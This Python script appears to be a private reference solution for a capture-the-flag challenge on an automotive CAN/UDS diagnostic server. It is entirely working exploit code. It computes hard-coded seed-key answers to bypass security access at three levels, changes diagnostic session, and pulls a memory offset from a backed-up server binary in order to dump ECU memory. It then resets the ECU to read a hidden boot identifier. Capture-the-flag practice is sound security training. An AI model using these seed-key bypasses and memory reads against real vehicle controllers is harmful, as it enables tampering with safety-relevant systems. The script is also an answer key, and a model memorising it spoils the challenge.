"""Private reference: recover all five flags over the player's CAN interface."""

import re
import socket
import struct
import time
import zipfile


def connect():
    sock = socket.socket(socket.AF_CAN, socket.SOCK_DGRAM, socket.CAN_ISOTP)
    sock.settimeout(2)
    sock.bind(("vcan0", 0x7E8, 0x7E0))
    return sock


bus = connect()


def request(data):
    bus.send(data)
    return bus.recv(4096)


def show(data):
    match = re.search(rb"DAEDALUS\{[^}]+\}", data)
    assert match, data.hex()
    print(match.group().decode(), flush=True)


def key3(seed):
    value = ((seed << 7) | (seed >> 25)) & 0xFFFFFFFF
    value ^= 0xCAFEBABE
    value = (value + 0x12345678) & 0xFFFFFFFF
    value = (value & 0xFFFF0000) | ((value & 0xFFFF) ^ 0xABCD)
    return value ^ 0xDEADBEEF


def key5(seed):
    value = seed ^ 0x12345678 ^ 0x87654321
    value = ((value >> 13) | (value << 19)) & 0xFFFFFFFF
    value = (value & 0xFF00FF00) | ((value & 0x00FF00FF) ^ 0x55555555)
    value = (value + 0xDEADBEEF) & 0xFFFFFFFF
    return value ^ 0xCAFEBABE


def unlock(level, algorithm):
    response = request(bytes([0x27, level]))
    assert response[:2] == bytes([0x67, level]), response.hex()
    seed = int.from_bytes(response[2:6], "big")
    key = algorithm(seed) & 0xFFFFFFFF
    response = request(bytes([0x27, level + 1]) + struct.pack(">I", key))
    assert response[:2] == bytes([0x67, level + 1]), response.hex()


show(request(bytes.fromhex("22 f1 90")))
unlock(1, lambda seed: seed ^ 0xDEADBEEF)
show(request(bytes.fromhex("22 c1 c2")))
assert request(bytes.fromhex("10 02"))[0] == 0x50
unlock(3, key3)
show(request(bytes.fromhex("22 d1 d2")))
unlock(5, key5)

# Reverse the readable testing artifact to locate the mapped memory flag slot.
with zipfile.ZipFile("/home/tester/backups/uds_server_20260702.zip") as archive:
    binary = archive.read(next(n for n in archive.namelist() if n.endswith("uds_server")))
offset = binary.index(b"TEST{FAKE_FLAGS_IN_TESTING_MEMORY_PLACEHOLDER_")
show(request(bytes.fromhex("23 14") + struct.pack(">I", 0x40000000 + offset) + b"\x60"))

assert request(bytes.fromhex("11 04"))[:2] == bytes.fromhex("51 04")
bus.send(bytes.fromhex("11 81"))
bus.close()
time.sleep(3.2)
for _ in range(8):
    bus = connect()
    try:
        response = request(bytes.fromhex("22 b0 07"))
        if response[:3] == bytes.fromhex("62 b0 07"):
            show(response)
            break
    except TimeoutError:
        pass
    finally:
        bus.close()
    time.sleep(0.5)
else:
    raise RuntimeError("The hidden boot DID was not recovered")
